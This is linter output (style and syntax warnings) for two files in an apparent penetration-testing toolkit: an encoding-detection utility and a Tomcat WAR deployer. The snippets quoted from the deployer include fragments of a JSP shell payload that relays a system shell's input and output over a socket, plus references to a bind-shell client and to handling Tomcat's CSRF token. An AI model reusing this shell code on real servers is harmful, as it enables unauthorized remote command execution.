SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\reencode.py:260:24
    |
258 |         for encoder in encodings:
259 |             if type(encoder) == str:
260 |                 if not encoder in self.encodersMap.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |                     raise Exception("Passed unknown encoder's name.")
262 |             elif not issubclass(ReEncoder.Encoder, encoder):
    |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\web\reencode.py:260:24
    |
258 |         for encoder in encodings:
259 |             if type(encoder) == str:
260 |                 if not encoder in self.encodersMap.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |                     raise Exception("Passed unknown encoder's name.")
262 |             elif not issubclass(ReEncoder.Encoder, encoder):
    |
help: Convert to `not in`

N806 Variable `maxSteps` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:267:9
    |
265 |     def generateEncodingTree(self, data):
266 |         step = 0
267 |         maxSteps = len(self.encoders) * ReEncoder.MaxEncodingDepth
    |         ^^^^^^^^
268 |
269 |         peeledBefore = 0
    |

N806 Variable `peeledBefore` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:269:9
    |
267 |         maxSteps = len(self.encoders) * ReEncoder.MaxEncodingDepth
268 |
269 |         peeledBefore = 0
    |         ^^^^^^^^^^^^
270 |         peeledOff = 0
271 |         currData = data
    |

N806 Variable `peeledOff` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:270:9
    |
269 |         peeledBefore = 0
270 |         peeledOff = 0
    |         ^^^^^^^^^
271 |         currData = data
    |

N806 Variable `currData` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:271:9
    |
269 |         peeledBefore = 0
270 |         peeledOff = 0
271 |         currData = data
    |         ^^^^^^^^
272 |
273 |         while step < maxSteps:
    |

N806 Variable `peeledBefore` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:274:13
    |
273 |         while step < maxSteps:
274 |             peeledBefore = peeledOff
    |             ^^^^^^^^^^^^
275 |             for encoder in self.encoders:
276 |                 step += 1
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:279:21
    |
278 |                   ReEncoder.log(
279 | /                     '[.] Trying: {} (peeled off: {}). Current form: "{}"'.format(
280 | |                         encoder.name(), peeledOff, currData
281 | |                     )
    | |_____________________^
282 |                   )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:292:29
    |
290 |                       ):
291 |                           ReEncoder.log(
292 | /                             "[.] Unclear situation whether input ({}) is Base64 encoded. Branching.".format(
293 | |                                 currData
294 | |                             )
    | |_____________________________^
295 |                           )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:303:29
    |
301 |                       ):
302 |                           ReEncoder.log(
303 | /                             "[.] Unclear situation whether input ({}) is Hex encoded. Branching.".format(
304 | |                                 currData
305 | |                             )
    | |_____________________________^
306 |                           )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:310:35
    |
308 |                         yield ("None", currData, True)
309 |
310 |                     ReEncoder.log("[+] Detected encoder: {}".format(encoder.name()))
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
311 |
312 |                     currData = encoder.decode(currData)
    |
help: Convert to f-string

N806 Variable `currData` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:312:21
    |
310 |                     ReEncoder.log("[+] Detected encoder: {}".format(encoder.name()))
311 |
312 |                     currData = encoder.decode(currData)
    |                     ^^^^^^^^
313 |                     yield (encoder.name(), currData, False)
    |

N806 Variable `peeledOff` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:315:21
    |
313 |                     yield (encoder.name(), currData, False)
314 |
315 |                     peeledOff += 1
    |                     ^^^^^^^^^
316 |
317 |                     break
    |

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\web\reencode.py:324:13
    |
322 |     def formEncodingCandidates(self, root):
323 |         iters = [
324 |             [node for node in children]
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
325 |             for children in anytree.LevelOrderGroupIter(root)
326 |         ]
    |
help: Rewrite using `list()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:335:17
    |
334 |               ReEncoder.log(
335 | /                 '[.] Candidate for best decode using {}: "{}"...'.format(
336 | |                     name, decoded[:20]
337 | |                 )
    | |_________________^
338 |               )
    |
help: Convert to f-string

N806 Variable `printableEncodings` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:368:10
    |
367 |     def evaluateEncodingTree(self, root):
368 |         (printableEncodings, printableCandidate) = self.evaluateEncodingTreePicker(
    |          ^^^^^^^^^^^^^^^^^^
369 |             root, False
370 |         )
    |

N806 Variable `printableCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:368:30
    |
367 |     def evaluateEncodingTree(self, root):
368 |         (printableEncodings, printableCandidate) = self.evaluateEncodingTreePicker(
    |                              ^^^^^^^^^^^^^^^^^^
369 |             root, False
370 |         )
    |

N806 Variable `binaryEncodings` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:371:10
    |
369 |             root, False
370 |         )
371 |         (binaryEncodings, binaryCandidate) = self.evaluateEncodingTreePicker(root, True)
    |          ^^^^^^^^^^^^^^^
372 |
373 |         if self.preferredOutputFormat == ReEncoder.PREFER_TEXT:
    |

N806 Variable `binaryCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:371:27
    |
369 |             root, False
370 |         )
371 |         (binaryEncodings, binaryCandidate) = self.evaluateEncodingTreePicker(root, True)
    |                           ^^^^^^^^^^^^^^^
372 |
373 |         if self.preferredOutputFormat == ReEncoder.PREFER_TEXT:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:386:13
    |
384 |           ReEncoder.log("\n---------------------------------------")
385 |           ReEncoder.log(
386 | /             "[>] Winning printable encoding path scored: {} points.".format(
387 | |                 printableCandidate[2]
388 | |             )
    | |_____________^
389 |           )
390 |           ReEncoder.log(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:391:13
    |
389 |           )
390 |           ReEncoder.log(
391 | /             "[>] Winning binary encoding path scored: {} points.".format(
392 | |                 binaryCandidate[2]
393 | |             )
    | |_____________^
394 |           )
    |
help: Convert to f-string

N803 Argument name `preferBinary` should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:404:48
    |
402 |         return binaryEncodings
403 |
404 |     def evaluateEncodingTreePicker(self, root, preferBinary):
    |                                                ^^^^^^^^^^^^
405 |         candidates = self._evaluateEncodingTreeWorker(root, preferBinary)
    |

N806 Variable `maxCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:407:9
    |
405 |         candidates = self._evaluateEncodingTreeWorker(root, preferBinary)
406 |
407 |         maxCandidate = 0
    |         ^^^^^^^^^^^^
408 |
409 |         for i in range(len(candidates)):
    |

F841 Local variable `name` is assigned to but never used
   --> security\penetration-testing-tools\web\reencode.py:412:13
    |
410 |             candidate = candidates[i]
411 |
412 |             name = candidate[0]
    |             ^^^^
413 |             decoded = candidate[1]
414 |             points = float(candidate[2])
    |
help: Remove assignment to unused variable `name`

F841 Local variable `decoded` is assigned to but never used
   --> security\penetration-testing-tools\web\reencode.py:413:13
    |
412 |             name = candidate[0]
413 |             decoded = candidate[1]
    |             ^^^^^^^
414 |             points = float(candidate[2])
    |
help: Remove assignment to unused variable `decoded`

N806 Variable `maxCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:417:17
    |
416 |             if points > candidates[maxCandidate][2]:
417 |                 maxCandidate = i
    |                 ^^^^^^^^^^^^
418 |
419 |         winningCandidate = candidates[maxCandidate]
    |

N806 Variable `winningCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:419:9
    |
417 |                 maxCandidate = i
418 |
419 |         winningCandidate = candidates[maxCandidate]
    |         ^^^^^^^^^^^^^^^^
420 |         winningPaths = anytree.search.findall_by_attr(
421 |             root, name="decoded", value=winningCandidate[1]
    |

N806 Variable `winningPaths` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:420:9
    |
419 |         winningCandidate = candidates[maxCandidate]
420 |         winningPaths = anytree.search.findall_by_attr(
    |         ^^^^^^^^^^^^
421 |             root, name="decoded", value=winningCandidate[1]
422 |         )
    |

N806 Variable `winningPath` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:425:9
    |
424 |         ReEncoder.log("[?] Other equally good candidate paths:\n" + str(winningPaths))
425 |         winningPath = winningPaths[0]
    |         ^^^^^^^^^^^
426 |
427 |         preferred = "printable"
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:432:13
    |
431 |           ReEncoder.log(
432 | /             "[+] Winning decode path for {} output is:\n{}".format(
433 | |                 preferred, str(winningPath)
434 | |             )
    | |_____________^
435 |           )
    |
help: Convert to f-string

N803 Argument name `preferBinary` should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:440:49
    |
438 |         return (encodings, winningCandidate)
439 |
440 |     def _evaluateEncodingTreeWorker(self, root, preferBinary=False):
    |                                                 ^^^^^^^^^^^^^^^^^^
441 |         weights = {
442 |             "unreadableChars": 0.0,
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:466:17
    |
465 |               ReEncoder.log(
466 | /                 '[=] Evaluating candidate: {} (entropy: {}, data: "{}")'.format(
467 | |                     name, entropy, decoded
468 | |                 )
    | |_________________^
469 |               )
    |
help: Convert to f-string

N806 Variable `printablePoints` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:472:13
    |
471 |             # Step 1: Adding points for printable percentage.
472 |             printablePoints = float(weights["printableChars"]) * (
    |             ^^^^^^^^^^^^^^^
473 |                 float(printables) / float(len(decoded))
474 |             )
    |

N806 Variable `nonPrintablePoints` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:475:13
    |
473 |                 float(printables) / float(len(decoded))
474 |             )
475 |             nonPrintablePoints = float(weights["unreadableChars"]) * (
    |             ^^^^^^^^^^^^^^^^^^
476 |                 float(nonprintables) / float(len(decoded))
477 |             )
    |

N806 Variable `entropyPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:487:17
    |
485 |             ):
486 |                 ReEncoder.log("\tAdding fine for being base64")
487 |                 entropyPoints = entropy * (weights["entropyScore"] * 0.666666)
    |                 ^^^^^^^^^^^^^
488 |                 lengthPoints = float(len(decoded)) * (weights["length"] * 0.666666)
489 |             else:
    |

N806 Variable `lengthPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:488:17
    |
486 |                 ReEncoder.log("\tAdding fine for being base64")
487 |                 entropyPoints = entropy * (weights["entropyScore"] * 0.666666)
488 |                 lengthPoints = float(len(decoded)) * (weights["length"] * 0.666666)
    |                 ^^^^^^^^^^^^
489 |             else:
490 |                 entropyPoints = entropy * weights["entropyScore"]
    |

N806 Variable `entropyPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:490:17
    |
488 |                 lengthPoints = float(len(decoded)) * (weights["length"] * 0.666666)
489 |             else:
490 |                 entropyPoints = entropy * weights["entropyScore"]
    |                 ^^^^^^^^^^^^^
491 |                 lengthPoints = float(len(decoded)) * weights["length"]
    |

N806 Variable `lengthPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:491:17
    |
489 |             else:
490 |                 entropyPoints = entropy * weights["entropyScore"]
491 |                 lengthPoints = float(len(decoded)) * weights["length"]
    |                 ^^^^^^^^^^^^
492 |
493 |             if printables > nonprintables:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:496:21
    |
494 |                 ReEncoder.log("More printable chars than binary ones.")
495 |                 ReEncoder.log(
496 |                     "\tAdding {} points for printable entropy.".format(entropyPoints)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
497 |                 )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:500:21
    |
499 |                   ReEncoder.log(
500 | /                     "\tAdding {} points for printable characters.".format(
501 | |                         printablePoints
502 | |                     )
    | |_____________________^
503 |                   )
504 |                   points += printablePoints
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:508:21
    |
506 |                 ReEncoder.log("More binary chars than printable ones.")
507 |                 ReEncoder.log(
508 |                     "\tAdding {} points for binary entropy.".format(entropyPoints)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
509 |                 )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:512:21
    |
511 |                   ReEncoder.log(
512 | /                     "\tAdding {} points for binary characters.".format(
513 | |                         nonPrintablePoints
514 | |                     )
    | |_____________________^
515 |                   )
516 |                   points += nonPrintablePoints
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:521:27
    |
520 |             # Step 4: Add points for length
521 |             ReEncoder.log("\tAdding {} points for length.".format(lengthPoints))
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
522 |             points += lengthPoints
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:524:27
    |
522 |             points += lengthPoints
523 |
524 |             ReEncoder.log("\tScored in total: {} points.".format(points))
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
525 |             candidates[i][2] = points
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:538:17
    |
536 |           for name, curr, branch in self.generateEncodingTree(data):
537 |               ReEncoder.log(
538 | /                 '[*] Generator returned: ("{}", "{}", {})'.format(
539 | |                     name, curr[:20], str(branch)
540 | |                 )
    | |_________________^
541 |               )
    |
help: Convert to f-string

N806 Variable `currNode` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:543:13
    |
541 |             )
542 |
543 |             currNode = anytree.Node(name, parent=prev, decoded=curr)
    |             ^^^^^^^^
544 |             if branch:
545 |                 pass
    |

B007 Loop control variable `fill` not used within loop body
   --> security\penetration-testing-tools\web\reencode.py:549:18
    |
547 |                 prev = currNode
548 |
549 |         for pre, fill, node in anytree.RenderTree(root):
    |                  ^^^^
550 |             if node.name != "None":
551 |                 ReEncoder.log(
    |
help: Rename unused `fill` to `_fill`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\reencode.py:552:21
    |
550 |               if node.name != "None":
551 |                   ReEncoder.log(
552 | /                     "%s%s (%s)"
553 | |                     % (pre, node.name, node.decoded[:20].decode("ascii", "ignore"))
    | |___________________________________________________________________________________^
554 |                   )
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:557:23
    |
556 |         self.encodings = self.getWinningDecodePath(root)
557 |         ReEncoder.log("[+] Selected encodings: {}".format(str(self.encodings)))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
558 |
559 |     def decode(self, data, preferredOutputFormat=PREFER_AUTO, encodings=[]):
    |
help: Convert to f-string

N803 Argument name `preferredOutputFormat` should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:559:28
    |
557 |         ReEncoder.log("[+] Selected encodings: {}".format(str(self.encodings)))
558 |
559 |     def decode(self, data, preferredOutputFormat=PREFER_AUTO, encodings=[]):
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
560 |         self.preferredOutputFormat = preferredOutputFormat
    |

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\web\reencode.py:559:73
    |
557 |         ReEncoder.log("[+] Selected encodings: {}".format(str(self.encodings)))
558 |
559 |     def decode(self, data, preferredOutputFormat=PREFER_AUTO, encodings=[]):
    |                                                                         ^^
560 |         self.preferredOutputFormat = preferredOutputFormat
    |
help: Replace with `None`; initialize within function

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:568:17
    |
566 |           ):
567 |               raise Exception(
568 | /                 "Unknown preferred output format specified in decode(): {}".format(
569 | |                     preferredOutputFormat
570 | |                 )
    | |_________________^
571 |               )
    |
help: Convert to f-string

N806 Variable `encoderName` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:579:13
    |
577 |             self.encodings = encodings
578 |
579 |         for encoderName in self.encodings:
    |             ^^^^^^^^^^^
580 |             d = self.encodersMap[encoderName].decode(data)
581 |             data = d
    |

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\web\reencode.py:585:38
    |
583 |         return data
584 |
585 |     def encode(self, data, encodings=[]):
    |                                      ^^
586 |         if encodings:
587 |             encodings.reverse()
    |
help: Replace with `None`; initialize within function

N806 Variable `encoderName` in function should be lowercase
   --> security\penetration-testing-tools\web\reencode.py:591:13
    |
589 |             self.encodings = encodings
590 |
591 |         for encoderName in self.encodings[::-1]:
    |             ^^^^^^^^^^^
592 |             e = self.encodersMap[encoderName].encode(data)
593 |             data = e
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:607:15
    |
605 |     if len(argv) != 2:
606 |         print("Usage: reencode.py <text|file>")
607 |         print('Using sample: "{}"'.format(sample))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
608 |         text = sample
609 |     else:
    |
help: Convert to f-string

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\web\reencode.py:613:17
    |
612 |         if os.path.isfile(text):
613 |             f = open(text, "rb")
    |                 ^^^^
614 |             text = f.read()
615 |             f.close()
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:620:11
    |
618 |     decoded = decoder.decode(text)
619 |
620 |     print('(1) DECODED TEXT: "{}"'.format(decoded))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
621 |
622 |     decoded = "FOO " + decoded + " BAR"
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:624:11
    |
622 |     decoded = "FOO " + decoded + " BAR"
623 |
624 |     print('\n(2) TO BE ENCODED TEXT: "{}"'.format(decoded))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
625 |
626 |     decoded = decoder.encode(decoded)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\reencode.py:627:11
    |
626 |     decoded = decoder.encode(decoded)
627 |     print('(3) ENCODED FORM: "{}"'.format(decoded))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to f-string

E701 Multiple statements on one line (colon)
  --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:81:25
   |
79 |         while True:
80 |             chunk = sock.recv(1)
81 |             if not chunk: break
   |                         ^
82 |             res += chunk
83 |     except:
   |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:105:1
    |
103 |             logger.error("Executing '%s' returned: '%s'" % (cmd, str(e)))
104 |     return ""
105 |     
    | ^^^^
106 | def issueCommand(sock, cmd, isWindows, path = ''):
107 |     if isWindows:
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:138:16
    |
136 |             initialRecv = recvall(sock)
137 |             sock.settimeout(None)
138 |         except: 
    |                ^
139 |             pass
    |
help: Remove trailing whitespace

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:206:12
    |
204 |         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
205 |         sock.settimeout(int(opts.timeout))
206 |     except socket.error, e:
    |            ^^^^^^^^^^^^^^^
207 |         logger.error("Creating socket for bind-shell client failed: '%s'" % e)
208 |         return False
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:428:1
    |
426 |     payload = '''
427 |     <%%
428 |       class StreamConnector extends Thread {
    | ^^^^^^
429 |         InputStream ins;
430 |         OutputStream outs;
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:433:1
    |
432 |         StreamConnector( InputStream ins, OutputStream outs ) {
433 |           this.ins = ins;
    | ^^^^^^^^^^
434 |           this.outs = outs;
435 |         }
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:434:1
    |
432 |         StreamConnector( InputStream ins, OutputStream outs ) {
433 |           this.ins = ins;
434 |           this.outs = outs;
    | ^^^^^^^^^^
435 |         }
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:438:1
    |
437 |         public void run() {
438 |           BufferedReader bufin  = null;
    | ^^^^^^^^^^
439 |           BufferedWriter bufout = null;
440 |           try {
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:439:1
    |
437 |         public void run() {
438 |           BufferedReader bufin  = null;
439 |           BufferedWriter bufout = null;
    | ^^^^^^^^^^
440 |           try {
441 |             bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:440:1
    |
438 |           BufferedReader bufin  = null;
439 |           BufferedWriter bufout = null;
440 |           try {
    | ^^^^^^^^^^
441 |             bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
442 |             bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:446:1
    |
444 |             int length;
445 |             while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 ) {
446 |               bufout.write( buffer, 0, length );
    | ^^^^^^^^^^^^^^
447 |               bufout.flush();
448 |             }
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:447:1
    |
445 |             while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 ) {
446 |               bufout.write( buffer, 0, length );
447 |               bufout.flush();
    | ^^^^^^^^^^^^^^
448 |             }
449 |           } catch( Exception e ){}
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:449:1
    |
447 |               bufout.flush();
448 |             }
449 |           } catch( Exception e ){}
    | ^^^^^^^^^^
450 |           try {
451 |             if( bufin != null )
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:450:1
    |
448 |             }
449 |           } catch( Exception e ){}
450 |           try {
    | ^^^^^^^^^^
451 |             if( bufin != null )
452 |               bufin.close();
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:452:1
    |
450 |           try {
451 |             if( bufin != null )
452 |               bufin.close();
    | ^^^^^^^^^^^^^^
453 |             if( bufout != null )
454 |               bufout.close();
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:454:1
    |
452 |               bufin.close();
453 |             if( bufout != null )
454 |               bufout.close();
    | ^^^^^^^^^^^^^^
455 |           } catch( Exception e ){}
456 |         }
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:455:1
    |
453 |             if( bufout != null )
454 |               bufout.close();
455 |           } catch( Exception e ){}
    | ^^^^^^^^^^
456 |         }
457 |       }
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:457:1
    |
455 |           } catch( Exception e ){}
456 |         }
457 |       }
    | ^^^^^^
458 |
459 |       try {
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:459:1
    |
457 |       }
458 |
459 |       try {
    | ^^^^^^
460 |         String ShellPath;
461 |         if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
    |

E101 Indentation contains mixed spaces and tabs
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:467:1
    |
465 |         }
466 |         %(socketInvocation)s
467 |       } catch( Exception e ) {}
    | ^^^^^^
468 |     %%>''' % {'socketInvocation': socketInvocation}
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:518:85
    |
517 |         String out = res.toString();
518 |                 if (out != null && out.length() > 5 && out.indexOf("<br/>") != -1) { 
    |                                                                                     ^
519 |                     out = out.substring(0, out.length() - 5);
520 |                 }
    |
help: Remove trailing whitespace

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:607:12
    |
605 |             return False
606 |
607 |     except urllib2.HTTPError, e:
    |            ^^^^^^^^^^^^^^^^^^^^
608 |         if e.code == 404:
609 |             logger.error(
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:659:25
    |
657 |                     logger.warning('Tomcat prevented us from deploying WAR with 403 Forbidden')
658 |                     major = 0
659 |                     try: 
    |                         ^
660 |                         major = int(TOMCAT_VERSION[0])
661 |                     except: pass
    |
help: Remove trailing whitespace

E701 Multiple statements on one line (colon)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:661:27
    |
659 |                     try: 
660 |                         major = int(TOMCAT_VERSION[0])
661 |                     except: pass
    |                           ^
662 |
663 |                     if major >= 7:
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:665:46
    |
663 |                     if major >= 7:
664 |                         logger.warning('Tomcat 7+ requires providing CSRF token and JSESSIONID.')
665 |                         if not addJsessionId: 
    |                                              ^
666 |                                 return deployApplication(browser, url, appname, warpath, modify_action, True)
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:718:1
    |
716 |     if INVOKE_URL != url:
717 |         url = INVOKE_URL
718 |         
    | ^^^^^^^^
719 |     appurl = '%s://%s/%s/' % (PROTO, url, appname)
720 |     logger.debug('Unloading application: "%s"' % appurl)
    |
help: Remove whitespace from blank line

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:747:24
    |
745 | ΓÇª     try:
746 | ΓÇª         resp = browser.submit()
747 | ΓÇª     except urllib2.HTTPError, e:
    |              ^^^^^^^^^^^^^^^^^^^^
748 | ΓÇª         logger.error('Unloading application failed with code: {}. Try changing appname with "--name" option to overcome this probleΓÇª
749 | ΓÇª         sys.exit(0)
    |

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:753:24
    |
751 |                 try:
752 |                     resp = browser.submit()
753 |                 except urllib2.HTTPError, e:
    |                        ^^^^^^^^^^^^^^^^^^^^
754 |                     if e.code == 403 and not addJsessionId:
755 |                         for c in COOKIE_JAR:
    |

E701 Multiple statements on one line (colon)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:802:44
    |
800 |     uri = url[1:] if url.startswith('/') else url
801 |     baseurl = webPathJoin(host, uri)
802 |     if INVOKE_URL and INVOKE_URL != baseurl: return INVOKE_URL
    |                                            ^
803 |     return baseurl
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:813:26
    |
811 | def browseToManager(host, url, user, password):
812 |     global COOKIE_JAR
813 |     global TOMCAT_VERSION 
    |                          ^
814 |     global INVOKE_URL
815 |     global MANAGER_URL
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:824:24
    |
822 |     managerurl = ''
823 |
824 |     tomcat_suffixes = [ 
    |                        ^
825 |         '', 
826 |         'manager', 
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:825:12
    |
824 |     tomcat_suffixes = [ 
825 |         '', 
    |            ^
826 |         'manager', 
827 |         'manager/html'
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:826:19
    |
824 |     tomcat_suffixes = [ 
